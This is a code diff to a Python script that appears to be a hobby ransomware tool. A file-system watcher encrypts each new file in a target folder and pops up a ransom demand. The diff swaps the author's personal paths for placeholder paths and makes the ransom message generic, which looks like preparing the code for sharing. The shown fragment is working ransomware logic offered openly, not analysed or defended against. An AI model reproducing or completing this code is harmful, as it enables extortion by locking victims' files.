@@ -42,7 +42,7 @@ class Watcher(FileSystemEventHandler):
         if not event.is_directory:
             print(f"New file detected: {event.src_path}")
             encrypt_file(event.src_path, self.key)
-            show_popup("Your file has been ENCRYPTED! Pay 20,000 rupees to decrypt the files!")
+            show_popup("Your file has been ENCRYPTED! Pay the ransom to get the file decrypted!")
 
 # Monitor Downloads folder
 def monitor_folder(path, key):
@@ -60,10 +60,10 @@ def monitor_folder(path, key):
 # Main function
 if __name__ == "__main__":
     # Specify the path to the Downloads folder
-    downloads_folder = r"C:\Users\whack\OneDrive\Desktop\Important Documents"
+    downloads_folder = "path\to\target\folder"
     
     # Read the encryption key from the file
-    key_file_path = r"C:\Users\whack\OneDrive\Desktop\STUFF\Programming STUFF\Python\Ransomeware\encryption_key.txt"
+    key_file_path = "path\to\encryption_key"
     key = read_key(key_file_path)
     
     # Start monitoring the folder
